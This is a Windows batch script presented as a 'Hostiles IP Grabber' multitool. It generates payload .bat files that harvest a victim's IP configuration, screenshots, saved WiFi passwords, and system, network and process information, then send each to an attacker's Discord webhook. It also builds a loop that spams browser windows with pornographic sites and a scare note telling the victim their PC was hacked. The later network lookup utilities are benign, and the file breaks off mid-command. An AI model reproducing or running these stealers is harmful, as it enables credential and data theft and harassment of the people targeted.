@echo off
chcp 65001 >nul
@echo off
setlocal
set "scriptDir=%~dp0"
set "player=%scriptDir%fmedia.exe"
start "" /min "%player%" "%scriptDir%DAY_OF_THE_DEAD.mp3" "%scriptDir%IDSTAYAWAYTOO.mp3" "%scriptDir%DEADINSIDE.mp3" "%scriptDir%CELINE.mp3" "%scriptDir%swore to lose.mp3"

title Hostiles IP Grabber
color D
endlocal


:menu
cls
echo.
echo "  ___ ___                 __  .__.__                    ________            ___.  ___.                 "
echo " /   |   \  ____  _______/  |_|__|  |   ____   ______  /  _____/___________ \_ |__\_ |__   ___________ "
echo "/    ~    \/  _ \/  ___/\   __\  |  | _/ __ \ /  ___/ /   \  __\_  __ \__  \ | __ \| __ \_/ __ \_  __ \"
echo "\    Y    |  <_> |___ \  |  | |  |  |_\  ___/ \___ \  \    \_\  \  | \// __ \| \_\ \ \_\ \  ___/|  | \/"
echo " \___|_  / \____/____  > |__| |__|____/\___  >____  >  \______  /__|  |____  /___  /___  /\___  >__|   "
echo "       \/            \/                    \/     \/          \/           \/    \/    \/     \/    "
echo and multitool <3
echo.
echo.
echo.
echo     ════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
echo              📋 MAIN MENU                  from here is just cybersec tools there will be somemore Created ones 
echo     ════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
echo.
echo     N nextpage
echo     ╰┈➤ 1. Create IP Grabber               
echo     ╰┈➤ 2. PC raper                        
echo     ╰┈➤ 3. Screenshot Maker                
echo     ╰┈➤ 4. Browser Opener                  
echo     ╰┈➤ 5. Note Creator                    
echo     ╰┈➤ 6. WiFi Password Viewer            
echo     ╰┈➤ 7. System Information Collector    
echo     ╰┈➤ 8. net scanner                    
echo     ╰┈➤ 9. process viewer                  
echo     ╰┈➤ 10. harware info                   
echo     ╰┈➤ 0. Exit
echo.
echo     ═══════════════════════════════════
echo.
set /p choice=Enter your choice: 

if "%choice%"=="N" goto numba-pagetwo
if "%choice%"=="1" goto Grabber
if "%choice%"=="2" goto pc-raper
if "%choice%"=="3" goto screenshot
if "%choice%"=="4" goto pc-crasher
if "%choice%"=="5" goto Note
if "%choice%"=="6" goto wifi_viewer
if "%choice%"=="7" goto system_info
if "%choice%"=="8" goto network_scanner
if "%choice%"=="9" goto process_viewer 
if "%choice%"=="10" goto hardware_info

goto menu

:numba-pagetwo
echo page two 
cls 
echo Page two 
echo ║╰┈➤11. Subdomain Finder                          ║
echo ║╰┈➤12. Ping & Traceroute                         ║
echo ║╰┈➤13. WHOIS Lookup                              ║
echo ║╰┈➤14. Reverse DNS Lookup                        ║
echo ║╰┈➤15. MACAddress Lookup                         ║
echo ║╰┈➤16. ARP Table Viewer                          ║
echo ║╰┈➤17. SSL Certificate Info                      ║
echo ║╰┈➤18. Running Services Viewr                    ║
echo ║╰┈➤19. Startup Program Lister                    ║
set /p choice=enter your choice:

if "%choice%"=="N" goto page-numba-three 
if "%choice%"=="11" goto portscanner
if "%choice%"=="12" goto subdomainfinde
if "%choice%"=="13" goto pingtraceroute
if "%choice%"=="14" goto whoislookup
if "%choice%"=="15" goto reversedns
if "%choice%"=="16" goto maclookup
if "%choice%"=="17" goto arptable
if "%choice%"=="18" goto sslinfo
if "%choice%"=="19" goto servicesviewer


:page-numba-three 
echo page three 
cls 
echo ║ 20.  Start up programs                          ║
echo ║ 21.  Log File Extractor                         ║
echo ║ 22.  File Metadata Viewer                       ║
echo ║ 23  Registry Key Searcher                       ║
echo ║ 24  Process Dumper (basic)                      ║
echo ║ 25  Password Strength Checker                   ║
echo ║ 26  Hash Cracker (offline, small dict)          ║
echo ║ 27  Brute Force Simulator (educational)         ║
echo ║ 28  Firewall Rules Viewer                       ║
echo ║ 29  Vulnerability Checker (local hints)         ║
echo ║ 30  Packet Capture Launcher                     ║
echo ║ 31  Base64 / Hex Encoder-Decoder                ║
echo ║ 32  Data Obfuscator                             ║
echo ║ 33  Steganography Tool (basic)                  ║
echo ║ B   Go back to page two                         ║
set /p choice="Enter your choice: "

if "%choice%"=="B" goto numba-pagetwo
if "%choice%"=="20" goto startupprograms
if "%choice%"=="21" goto logextractor
if "%choice%"=="22" goto filemetadata
if "%choice%"=="23" goto registrysearch
if "%choice%"=="24" goto processdumper
if "%choice%"=="25" goto pwdstrength
if "%choice%"=="26" goto hashcracker
if "%choice%"=="27" goto bruteforce
if "%choice%"=="28" goto firewallrules
if "%choice%"=="29" goto vulnchecker
if "%choice%"=="30" goto packetcapture
if "%choice%"=="31" goto base64hex
if "%choice%"=="32" goto dataobfuscator
if "%choice%"=="33" goto steganography



:Grabber
cls
echo.
echo "  _    _           _   _ _              _____           _     _               "
echo " | |  | |         | | (_) |            / ____|         | |   | |              "
echo " | |__| | ___  ___| |_ _| | ___  ___  | |  __ _ __ __ _| |__ | |__   ___ _ __ "
echo " |  __  |/ _ \/ __| __| | |/ _ \/ __| | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|"
echo " | |  | | (_) \__ \ |_| | |  __/\__ \ | |__| | | | (_| | |_) | |_) |  __/ |   "
echo " |_|  |_|\___/|___/\__|_|_|\___||___/  \_____|_|  \__,_|_.__/|_.__/ \___|_|   "
echo.
set /p "webhook=Enter your Discord webhook: "

if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo Creating IP grabber script...
timeout /t 3 >nul

REM Create the batch script
(
    echo @echo off
    echo ipconfig ^> ip.txt
    echo curl --silent --output /dev/null -F 1=^@ip.txt %webhook%
    echo del ip.txt
) > ip_grabber_execute.bat

echo IP grabber script has been created as ip_grabber_execute.bat.
pause
goto menu

:pc-raper
cls
echo pc-raper 


echo Pc raper script...
timeout /t 3 >nul

REM Create the batch script
(
    echo @echo off
    echo :loop
    echo start https://www.youtube.com/watch?v=64UR8HVz-oo
    echo timeout /t 1 ^>nul
    echo goto loop
) > browser_opener.bat

echo Browser opener script has been created as browser_opener.bat.
pause
goto menu

--------------------------------------*
:screenshot 
cls
echo SCREENSHOT

set /p "webhook=Enter your Discord webhook: "

if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo pc screeni
timeout /t 3 >nul

REM Create the batch script
(
    echo @echo off
    echo powershell -command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $screenshot = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($screenshot); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $downloadsPath = Join-Path $env:USERPROFILE 'Downloads'; if(-not (Test-Path $downloadsPath)){ New-Item -ItemType Directory -Path $downloadsPath -Force }; $path = Join-Path $downloadsPath 'screenshot.png'; $screenshot.Save($path, [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $screenshot.Dispose(); $webhook = '%webhook%'; $boundary = [System.Guid]::NewGuid().ToString(); $LF = \"`r`n\"; $fileBytes = [System.IO.File]::ReadAllBytes($path); $fileName = 'screenshot.png'; $bodyLines = @(); $bodyLines += '--' + $boundary; $bodyLines += 'Content-Disposition: form-data; name=\"file\"; filename=\"' + $fileName + '\"'; $bodyLines += 'Content-Type: image/png'; $bodyLines += ''; $bodyLines += [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes); $bodyLines += '--' + $boundary + '--'; $body = $bodyLines -join $LF; Invoke-RestMethod -Uri $webhook -Method Post -ContentType \"multipart/form-data; boundary=$boundary\" -Body ([System.Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($body))"
    echo echo screenshot saved and sent through webhook
    echo pause 
) > Screenshot_execute.bat

echo Screenshot bat file has been made
pause
goto menu

:pc-crasher
cls
echo          𓆩☠︎︎𓆪
echo  ⋆༺BROWSER OPENER༻⋆

echo Creating browser opener script...
timeout /t 3 >nul

REM Create the batch script
(
    echo @echo off
    echo echo Browser opener started - Press Ctrl+C to stop
    echo echo Opening browser in 3 seconds...
    echo timeout /t 3
    echo :loop
    echo echo Opening browser...
    echo start "" "https://www.google.com"
    echo start "" "https://www.pornhub.com/view_video.php?viewkey=6527f52c82347"
    echo start "" "https://gaymidgetporn.com"
    echo echo Waiting 5 seconds...
    echo timeout /t 1
    echo goto loop
) > Browser_opener_execute.bat

echo Browser opener bat file has been made
echo.
echo To test: Run Browser_opener_execute.bat
pause
goto menu

:Note 
cls
echo "/\ "-.\ \   /\  __ \   /\__  _\ /\  ___\"                       
echo "\ \ \-.  \  \ \ \/\ \  \/_/\ \/ \ \  __\  "                   
echo  "\ \_\\"\_\  \ \_____\    \ \_\  \ \_____\  "                     
echo   "\/_/ \/_/   \/_____/     \/_/   \/_____/    "                   
echo   "                                              "                   
echo  "______     ______     __   __     _____     ______     ______    
echo "/\  ___\   /\  ___\   /\ "-.\ \   /\  __-.  /\  ___\   /\  == \ "  
echo "\ \___  \  \ \  __\   \ \ \-.  \  \ \ \/\ \ \ \  __\   \ \  __< "  
echo  "\/\_____\  \ \_____\  \ \_\\"\_\  \ \____-  \ \_____\  \ \_\ \_\ "
echo  "\/_____/   \/_____/   \/_/ \/_/   \/____/   \/_____/   \/_/ /_/ "
echo Send a message to the victime.

echo creating note 
timeout /t 3 >nul 

REM Create the batch script 
( 
    echo @echo off
    echo :start
    echo cls
    echo echo Hello %%USERNAME%%
    echo timeout /t 2 ^>nul
    echo cls
    echo echo Hello %%USERNAME%%
    echo echo we have hacked your pc
    echo timeout /t 2 ^>nul
    echo cls
    echo echo Hello %%USERNAME%%
    echo echo we have checked your pc
    echo echo and if you do nothing we will comprmize it
    echo timeout /t 2 ^>nul
    echo cls
    echo echo Hello %%USERNAME%%
    echo echo we have checked your pc
    echo echo and if you do nothing
    echo echo this is only a test
    echo timeout /t 5 ^>nul
    echo echo.
    echo echo Press any key to close...
    echo pause ^>nul
) > NOTE_TO_YOU.bat


:wifi_viewer
cls
echo WIFI PASSWORD VIEWER

set /p "webhook=Enter your Discord webhook: "

if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo Creating WiFi password viewer...
timeout /t 3 >nul

REM Create the batch script
(
    echo @echo off
    echo title WiFi Password Viewer
    echo echo Collecting WiFi information...
    echo netsh wlan show profiles ^> wifi_info.txt
    echo echo. ^>^> wifi_info.txt
    echo echo WiFi Passwords: ^>^> wifi_info.txt
    echo for /f "tokens=2 delims=:" %%%%i in ('netsh wlan show profiles ^^^| findstr "All User Profile"'^) do @for /f "tokens=*" %%%%j in ^('netsh wlan show profile name="%%%%i" key=clear ^^^| findstr "Key Content"'^) do @echo %%%%i: %%%%j ^>^> wifi_info.txt
    echo powershell -command "$webhook = '%webhook%'; $content = Get-Content 'wifi_info.txt' -Raw; $body = @{ content = '```markdown\n[WIFI INFORMATION]\n' + $content + '\n```' } | ConvertTo-Json; Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'"
    echo echo WiFi info sent to webhook
    echo del wifi_info.txt
    echo pause
) > WiFi_viewer_execute.bat

echo WiFi password viewer bat file has been made
pause
goto menu


:system_info
cls
echo SYSTEM INFORMATION COLLECTOR

set /p "webhook=Enter your Discord webhook: "

if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo Creating system info collector...
timeout /t 3 >nul

REM Create the batch script
(
    echo @echo off
    echo title System Information Collector
    echo echo Collecting system information...
    
    echo echo ^> system_info.txt
    echo echo ===== BASIC SYSTEM INFO ===== ^>^> system_info.txt
    echo echo Computer Name: %%COMPUTERNAME%% ^>^> system_info.txt
    echo echo Username: %%USERNAME%% ^>^> system_info.txt
    echo echo. ^>^> system_info.txt
    
    echo echo ===== OS VERSION ===== ^>^> system_info.txt
    echo ver ^>^> system_info.txt
    echo echo. ^>^> system_info.txt
    
    echo echo ===== SYSTEM DETAILS ===== ^>^> system_info.txt
    echo systeminfo ^| findstr /c:"OS Name" /c:"OS Version" /c:"System Type" /c:"Total Physical Memory" /c:"Available Physical Memory" /c:"System Manufacturer" /c:"System Model" ^>^> system_info.txt
    echo echo. ^>^> system_info.txt
    
    echo echo ===== CPU INFORMATION ===== ^>^> system_info.txt
    echo wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed /format:list ^>^> system_info.txt
    echo echo. ^>^> system_info.txt
    
    echo echo ===== GPU INFORMATION ===== ^>^> system_info.txt
    echo wmic path win32_VideoController get name,AdapterRAM,DriverVersion /format:list ^>^> system_info.txt
    echo echo. ^>^> system_info.txt
    
    echo echo ===== STORAGE INFORMATION ===== ^>^> system_info.txt
    echo echo --- Physical Disks --- ^>^> system_info.txt
    echo wmic diskdrive get model,size,mediaType,interfaceType /format:list ^>^> system_info.txt
    echo echo. ^>^> system_info.txt
    
    echo echo --- Partitions and Free Space --- ^>^> system_info.txt
    echo wmic logicaldisk where "DriveType=3" get DeviceID,Size,FreeSpace,FileSystem /format:list ^>^> system_info.txt
    echo echo. ^>^> system_info.txt
    
    echo echo ===== INSTALLED PROGRAMS ===== ^>^> system_info.txt
    echo wmic product get name,version /format:table ^>^> system_info.txt 2^>nul
    echo echo. ^>^> system_info.txt
    
    echo echo ===== NETWORK INFORMATION ===== ^>^> system_info.txt
    echo ipconfig /all ^| findstr /c:"IPv4" /c:"Physical" /c:"Description" ^>^> system_info.txt
    echo echo. ^>^> system_info.txt
    
    echo echo Sending information to Discord...
    echo powershell -command "$webhook = '%webhook%'; $content = [System.IO.File]::ReadAllText('system_info.txt'); $content = $content -replace '(?<=\D|^)(\d{10,})(?=\D|$)', [string]::Format('{0:N2} GB', [double]$args[0]/1GB); $body = @{content = '```markdown\n[SYSTEM INFORMATION REPORT]\n' + $content + '\n```' } | ConvertTo-Json; Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'"
    
    echo del system_info.txt
    echo echo Information sent successfully!
    echo pause
) > System_info_execute.bat

echo System info collector bat file has been made
pause
goto menu



:network_scanner
cls
echo NETWORK SCANNER

set /p "webhook=Enter your Discord webhook: "

if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo Creating network scanner...
timeout /t 3 >nul

REM Create the batch script
(
    echo @echo off
    echo title Network Scanner
    echo echo Collecting network information...
    
    echo echo ===== IP CONFIGURATION ===== ^> network_info.txt
    echo ipconfig /all ^>^> network_info.txt
    echo echo. ^>^> network_info.txt
    
    echo echo ===== ACTIVE CONNECTIONS ===== ^>^> network_info.txt
    echo netstat -ano ^| findstr /V "\[::\]" ^>^> network_info.txt
    echo echo. ^>^> network_info.txt
    
    echo echo ===== ARP CACHE ===== ^>^> network_info.txt
    echo arp -a ^>^> network_info.txt
    echo echo. ^>^> network_info.txt
    
    echo echo ===== NETWORK ADAPTERS ===== ^>^> network_info.txt
    echo wmic nic where "NetConnectionStatus=2" get Name,MACAddress /format:list ^>^> network_info.txt
    echo echo. ^>^> network_info.txt
    
    echo echo Processing and sending information to Discord...
    echo powershell -command "$webhook = '%webhook%'; $content = [System.IO.File]::ReadAllText('network_info.txt'); $maxLength = 1900; if ($content.Length -gt $maxLength) { $chunks = [System.Collections.ArrayList]@(); for ($i=0; $i -lt $content.Length; $i+=$maxLength) { $chunkLength = [Math]::Min($maxLength, $content.Length-$i); $chunk = $content.Substring($i, $chunkLength); [void]$chunks.Add('```markdown\n[NETWORK SCAN PART ' + ($chunks.Count+1) + ']\n' + $chunk + '\n```'); } foreach ($chunk in $chunks) { $body = @{content = $chunk} | ConvertTo-Json; Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'; Start-Sleep -Milliseconds 500; } } else { $body = @{content = '```markdown\n[NETWORK SCAN REPORT]\n' + $content + '\n```'} | ConvertTo-Json; Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'; }"
    
    echo del network_info.txt
    echo echo Network scan completed and sent!
    echo pause
) > Network_scanner_execute.bat

echo Network scanner bat file has been made
pause
goto menu

:process_viewer
cls
echo PROCESS VIEWER

set /p "webhook=Enter your Discord webhook: "

if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo Creating process viewer...
timeout /t 3 >nul

(
    echo @echo off
    echo title Process Viewer
    echo setlocal enabledelayedexpansion
    echo set "info_file=process_info_%%random%%.txt"
    
    echo echo [SYSTEM SUMMARY] ^> "!info_file!"
    echo wmic computersystem get model,name,manufacturer /format:list ^>^> "!info_file!"
    echo wmic os get name,version /format:list ^>^> "!info_file!"
    echo echo. ^>^> "!info_file!"
    
    echo echo [TOP PROCESSES BY MEMORY] ^>^> "!info_file!"
    echo set "temp_file=temp_mem_%%random%%.txt"
    echo tasklist /FI "MEMUSAGE gt 10240" /FO TABLE /NH /V ^> "!temp_file!"
    echo type "!temp_file!" ^| sort /R /+65 ^>^> "!info_file!"
    echo del "!temp_file!"
    echo echo. ^>^> "!info_file!"
    
    echo echo [TOP PROCESSES BY CPU] ^>^> "!info_file!"
    echo wmic path win32_perfformatteddata_perfproc_process get Name,PercentProcessorTime,IDProcess ^| findstr /R /C:"[1-9][0-9]%%%%" ^>^> "!info_file!"
    echo echo. ^>^> "!info_file!"
    
    echo echo [USER PROCESSES] ^>^> "!info_file!"
    echo tasklist /V /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "USERNAME ne N/A" /FO LIST ^>^> "!info_file!"
    
    echo echo Processing and sending information to Discord...
    echo powershell -command "$webhook = '%webhook%'; $content = [System.IO.File]::ReadAllText('!info_file!'); $content = $content -replace [char]13, ''; $maxLength = 1900; if ($content.Length -gt $maxLength) { $content = $content.Substring(0, $maxLength) + \"`n[Output truncated]\"; } $body = @{content = \"```markdown`n\" + $content + \"`n```\" } | ConvertTo-Json; Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'"
    
    echo del "!info_file!"
    echo echo Process information sent successfully!
    echo pause
) > Process_viewer_execute.bat

echo Process viewer bat file has been made
pause
goto menu


:hardware_info
cls
echo HARDWARE INFO

set /p "webhook=Enter your Discord webhook: "

if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo Creating hardware info viewer...
timeout /t 3 >nul

REM Create the batch script
(
    echo @echo off
    echo title Hardware Info Viewer
    echo echo ═══════════════════════════════════
    echo echo        HARDWARE INFO VIEWER
    echo echo ═══════════════════════════════════
    echo echo.
    echo echo CPU Information:
    echo wmic cpu get name,maxclockspeed,numberofcores,numberoflogicalprocessors
    echo echo.
    echo echo ═══════════════════════════════════
    echo echo Memory Information:
    echo wmic memorychip get capacity,speed,memorytype
    echo echo.
    echo echo Total RAM:
    echo wmic computersystem get TotalPhysicalMemory
    echo echo.
    echo echo ═══════════════════════════════════
    echo echo Disk Information:
    echo wmic diskdrive get size,model
    echo echo.
    echo echo Free Disk Space:
    echo dir c: /-c
    echo echo.
    echo echo ═══════════════════════════════════
    echo echo Graphics Card:
    echo wmic path win32_VideoController get name
    echo echo.
    echo pause
) > Hardware_info_execute.bat

echo Hardware info viewer bat file has been made
pause
goto menu


#                                █████                                                                       
#                               ░░███                                                                        
#  ████████   ██████  ████████  ███████    █████   ██████   ██████   ████████   ████████    ██████  ████████ 
# ░░███░░███ ███░░███░░███░░███░░░███░    ███░░   ███░░███ ░░░░░███ ░░███░░███ ░░███░░███  ███░░███░░███░░███
#  ░███ ░███░███ ░███ ░███ ░░░   ░███    ░░█████ ░███ ░░░   ███████  ░███ ░███  ░███ ░███ ░███████  ░███ ░░░ 
#  ░███ ░███░███ ░███ ░███       ░███ ███ ░░░░███░███  ███ ███░░███  ░███ ░███  ░███ ░███ ░███░░░   ░███     
#  ░███████ ░░██████  █████      ░░█████  ██████ ░░██████ ░░████████ ████ █████ ████ █████░░██████  █████    
#  ░███░░░   ░░░░░░  ░░░░░        ░░░░░  ░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░     
#  ░███                                                                                                      
#  █████                                                                                                     
# ░░░░░ 
:portscanner
cls
echo --- Port Scanner ---
set /p "target=Enter IP or hostname to scan: "
set /p "portrange=Enter port or range (e.g. 80 or 1-1024): "
if exist "nmap.exe" (
    echo Using nmap.exe...
    nmap.exe -Pn -sT -p %portrange% %target%
) else (
    echo nmap.exe not found. Using PowerShell test-netconnection scan (slow)...
    powershell -NoProfile -Command ^
        "for($p=%portrange%-split ','){if($_ -match '-'){$r=$_-split'-';for($i=[int]$r[0];$i-le [int]$r[1];$i++){Write-Host 'Scanning port' $i; if(Test-NetConnection -ComputerName '%target%' -Port $i -InformationLevel Quiet){Write-Host 'OPEN:' $i}}}else{$i=[int]$_;Write-Host 'Scanning port' $i; if(Test-NetConnection -ComputerName '%target%' -Port $i -InformationLevel Quiet){Write-Host 'OPEN:' $i}}}"
)
pause
goto menu

#                     █████         █████                                     ███                ██████   ███                 █████                   
#                    ░░███         ░░███                                     ░░░                ███░░███ ░░░                 ░░███                    
#   █████  █████ ████ ░███████   ███████   ██████  █████████████    ██████   ████  ████████    ░███ ░░░  ████  ████████    ███████   ██████  ████████ 
#  ███░░  ░░███ ░███  ░███░░███ ███░░███  ███░░███░░███░░███░░███  ░░░░░███ ░░███ ░░███░░███  ███████   ░░███ ░░███░░███  ███░░███  ███░░███░░███░░███
# ░░█████  ░███ ░███  ░███ ░███░███ ░███ ░███ ░███ ░███ ░███ ░███   ███████  ░███  ░███ ░███ ░░░███░     ░███  ░███ ░███ ░███ ░███ ░███████  ░███ ░░░ 
#  ░░░░███ ░███ ░███  ░███ ░███░███ ░███ ░███ ░███ ░███ ░███ ░███  ███░░███  ░███  ░███ ░███   ░███      ░███  ░███ ░███ ░███ ░███ ░███░░░   ░███     
#  ██████  ░░████████ ████████ ░░████████░░██████  █████░███ █████░░████████ █████ ████ █████  █████     █████ ████ █████░░████████░░██████  █████    
# ░░░░░░    ░░░░░░░░ ░░░░░░░░   ░░░░░░░░  ░░░░░░  ░░░░░ ░░░ ░░░░░  ░░░░░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░     ░░░░░ ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░░     
#                                                                                                                                                     
#                                                                                                                                                     
#        
:subdomainfinder
cls
echo --- Subdomain Finder ---
set /p "domain=Enter domain (example: example.com): "
set "words=www mail ftp dev test api admin beta staging"
for %%w in (%words%) do (
    setlocal enabledelayedexpansion
    set "host=%%w.%domain%"
    nslookup !host! 2>nul | find "Address" >nul
    if errorlevel 0 (
        echo Found: !host!
    )
    endlocal
)
echo Done.
pause
goto menu

#             ███                       █████                                                                         █████            
#            ░░░                       ░░███                                                                         ░░███             
#  ████████  ████  ████████    ███████ ███████   ████████   ██████    ██████   ██████  ████████   ██████  █████ ████ ███████    ██████ 
# ░░███░░███░░███ ░░███░░███  ███░░███░░░███░   ░░███░░███ ░░░░░███  ███░░███ ███░░███░░███░░███ ███░░███░░███ ░███ ░░░███░    ███░░███
#  ░███ ░███ ░███  ░███ ░███ ░███ ░███  ░███     ░███ ░░░   ███████ ░███ ░░░ ░███████  ░███ ░░░ ░███ ░███ ░███ ░███   ░███    ░███████ 
#  ░███ ░███ ░███  ░███ ░███ ░███ ░███  ░███ ███ ░███      ███░░███ ░███  ███░███░░░   ░███     ░███ ░███ ░███ ░███   ░███ ███░███░░░  
#  ░███████  █████ ████ █████░░███████  ░░█████  █████    ░░████████░░██████ ░░██████  █████    ░░██████  ░░████████  ░░█████ ░░██████ 
#  ░███░░░  ░░░░░ ░░░░ ░░░░░  ░░░░░███   ░░░░░  ░░░░░      ░░░░░░░░  ░░░░░░   ░░░░░░  ░░░░░      ░░░░░░    ░░░░░░░░    ░░░░░   ░░░░░░  
#  ░███                       ███ ░███                                                                                                 
#  █████                     ░░██████                                                                                                  
# ░░░░░                       ░░░░░░ 
:pingtraceroute
cls
echo --- Ping & Traceroute ---
set /p "target=Enter IP or hostname: "


set "target=%target:http://=%"
set "target=%target:https://=%"


for /f "tokens=1 delims=/" %%A in ("%target%") do set "target=%%A"

echo.
echo Pinging %target% (4 packets)...
ping -n 4 %target%
echo.
echo Traceroute to %target%:
tracert %target%
pause
goto numba-pagetwo


#                  █████                ███          ████                    █████                          
#                 ░░███                ░░░          ░░███                   ░░███                           
#  █████ ███ █████ ░███████    ██████  ████   █████  ░███   ██████   ██████  ░███ █████ █████ ████ ████████ 
# ░░███ ░███░░███  ░███░░███  ███░░███░░███  ███░░   ░███  ███░░███ ███░░███ ░███░░███ ░░███ ░███ ░░███░░███
#  ░███ ░███ ░███  ░███ ░███ ░███ ░███ ░███ ░░█████  ░███ ░███ ░███░███ ░███ ░██████░   ░███ ░███  ░███ ░███
#  ░░███████████   ░███ ░███ ░███ ░███ ░███  ░░░░███ ░███ ░███ ░███░███ ░███ ░███░░███  ░███ ░███  ░███ ░███
#   ░░████░████    ████ █████░░██████  █████ ██████  █████░░██████ ░░██████  ████ █████ ░░████████ ░███████ 
#    ░░░░ ░░░░    ░░░░ ░░░░░  ░░░░░░  ░░░░░ ░░░░░░  ░░░░░  ░░░░░░   ░░░░░░  ░░░░ ░░░░░   ░░░░░░░░  ░███░░░  
#                                                                                                  ░███     
#                                                                                                  █████    
#                                                                                                 ░░░░░ 
:whoislookup
cls
echo --- WHOIS Lookup (using nslookup) ---
set /p "target=Enter domain or hostname: "


set "target=%target:http://=%"
set "target=%target:https://=%"


for /f "tokens=1 delims=/" %%A in ("%target%") do set "target=%%A"

echo.
echo Looking up %target% ...
nslookup "%target%"
pause
goto numba-pagetwo


#                                                                         █████                   
#                                                                        ░░███                    
#  ████████   ██████  █████ █████  ██████  ████████   █████   ██████   ███████  ████████    █████ 
# ░░███░░███ ███░░███░░███ ░░███  ███░░███░░███░░███ ███░░   ███░░███ ███░░███ ░░███░░███  ███░░  
#  ░███ ░░░ ░███████  ░███  ░███ ░███████  ░███ ░░░ ░░█████ ░███████ ░███ ░███  ░███ ░███ ░░█████ 
#  ░███     ░███░░░   ░░███ ███  ░███░░░   ░███      ░░░░███░███░░░  ░███ ░███  ░███ ░███  ░░░░███
#  █████    ░░██████   ░░█████   ░░██████  █████     ██████ ░░██████ ░░████████ ████ █████ ██████ 
# ░░░░░      ░░░░░░     ░░░░░     ░░░░░░  ░░░░░     ░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░ ░░░░░ ░░░░░░  
#                                                                                                 
#                                                                                                 
#  
:reversedns
cls
echo --- Reverse DNS Lookup ---
set /p "ip=Enter IP address: "
nslookup %ip% | findstr /R /C:"name = "
pause
goto menu

#                                     ████                    █████                          
#                                    ░░███                   ░░███                           
#  █████████████    ██████    ██████  ░███   ██████   ██████  ░███ █████ █████ ████ ████████ 
# ░░███░░███░░███  ░░░░░███  ███░░███ ░███  ███░░███ ███░░███ ░███░░███ ░░███ ░███ ░░███░░███
#  ░███ ░███ ░███   ███████ ░███ ░░░  ░███ ░███ ░███░███ ░███ ░██████░   ░███ ░███  ░███ ░███
#  ░███ ░███ ░███  ███░░███ ░███  ███ ░███ ░███ ░███░███ ░███ ░███░░███  ░███ ░███  ░███ ░███
#  █████░███ █████░░████████░░██████  █████░░██████ ░░██████  ████ █████ ░░████████ ░███████ 
# ░░░░░ ░░░ ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░░  ░░░░░░   ░░░░░░  ░░░░ ░░░░░   ░░░░░░░░  ░███░░░  
#                                                                                   ░███     
#                                                                                   █████    
#                                                                                  ░░░░░ 
:maclookup
cls
echo --- MAC Address Lookup ---
set /p "ip=Enter local IP (leave blank to show ARP table): "
if "%ip%"=="" (
    arp -a
) else (
    for /f "tokens=1,2" %%a in ('arp -a ^| find "%ip%"') do set "mac=%%b"
    if defined mac (
        echo MAC address for %ip% is %mac%
        echo (Use an online OUI lookup to get vendor info)
    ) else (
        echo No ARP entry found for %ip%. Try pinging it first.
    )
)
pause
goto menu

#                                 █████              █████     ████          
#                                ░░███              ░░███     ░░███          
#   ██████   ████████  ████████  ███████    ██████   ░███████  ░███   ██████ 
#  ░░░░░███ ░░███░░███░░███░░███░░░███░    ░░░░░███  ░███░░███ ░███  ███░░███
#   ███████  ░███ ░░░  ░███ ░███  ░███      ███████  ░███ ░███ ░███ ░███████ 
#  ███░░███  ░███      ░███ ░███  ░███ ███ ███░░███  ░███ ░███ ░███ ░███░░░  
# ░░████████ █████     ░███████   ░░█████ ░░████████ ████████  █████░░██████ 
#  ░░░░░░░░ ░░░░░      ░███░░░     ░░░░░   ░░░░░░░░ ░░░░░░░░  ░░░░░  ░░░░░░  
#                      ░███                                                  
#                      █████                                                 
#                     ░░░░░ 
:arptable
cls
echo --- ARP Table ---
arp -a
pause
goto menu

#                  ████   ███                ██████          
#                 ░░███  ░░░                ███░░███         
#   █████   █████  ░███  ████  ████████    ░███ ░░░   ██████ 
#  ███░░   ███░░   ░███ ░░███ ░░███░░███  ███████    ███░░███
# ░░█████ ░░█████  ░███  ░███  ░███ ░███ ░░░███░    ░███ ░███
#  ░░░░███ ░░░░███ ░███  ░███  ░███ ░███   ░███     ░███ ░███
#  ██████  ██████  █████ █████ ████ █████  █████    ░░██████ 
# ░░░░░░  ░░░░░░  ░░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░      ░░░░░░  
:sslinfo
cls
echo --- SSL Certificate Info ---
set /p "host=Enter hostname (e.g. example.com): "
powershell -NoProfile -Command ^
